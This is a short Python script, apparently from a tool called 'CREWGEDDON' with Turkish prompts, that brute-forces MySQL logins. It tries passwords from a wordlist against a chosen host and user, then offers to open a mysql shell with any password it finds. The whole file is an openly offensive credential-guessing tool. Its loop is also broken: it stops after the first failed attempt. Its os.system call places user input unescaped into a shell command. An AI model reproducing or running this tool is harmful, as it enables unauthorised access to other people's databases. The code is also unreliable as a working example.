from colorama import Fore
import time
import os
import pymysql
pymysql.install_as_MySQLdb()

def mySql():
      host = input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}MySQL Host (localhost): ")
      user = input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}MySQL Kullanıcı Adı (root): ")
      
      password_file = input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}Şifrelerin Olduğu Wordlist (passwordlist.txt): ")
      try:
         passwords = open(password_file, "r").readlines()
         print(f"{Fore.CYAN}[CREWGEDDON]: {Fore.WHITE}Şifrenin bulunması biraz zaman alabilir, lütfen bu ekranı kapatmayınız..")
         time.sleep(2)
         for password in passwords:
               password = password.strip()
               try:
                  pymysql.connect(host, user, password)
                  print(f"{Fore.GREEN}[CREWGEDDON]: {Fore.WHITE}MySQL Şifresi Bulundu. Şifre: {password}")
                  mysql_login = input(f"{Fore.GREEN}[CREWGEDDON]: {Fore.WHITE}MySql'e giriş yapılsın mı? (e/h): ")

                  if mysql_login.lower() == "e":
                     os.system(f"mysql -u {user} -p {password} -h {host}")
                  elif mysql_login.lower() == "h":
                     break
                  else:
                     print(f"{Fore.RED}[CREWGEDDON]: {Fore.WHITE}Geçersiz cevap belirttiniz.")
                     break
               except pymysql.Error:
                   print(f"{Fore.RED}[CREWGEDDON]: {Fore.WHITE}Şifre WordList'de bulunamadı..")
                   break 
      except FileNotFoundError:
         print(f"{Fore.RED}[CREWGEDDON]: {Fore.WHITE}Belirttiğiniz WORDLIST belgesi bulunamadı. {password_file}.txt")
         time.sleep(3)

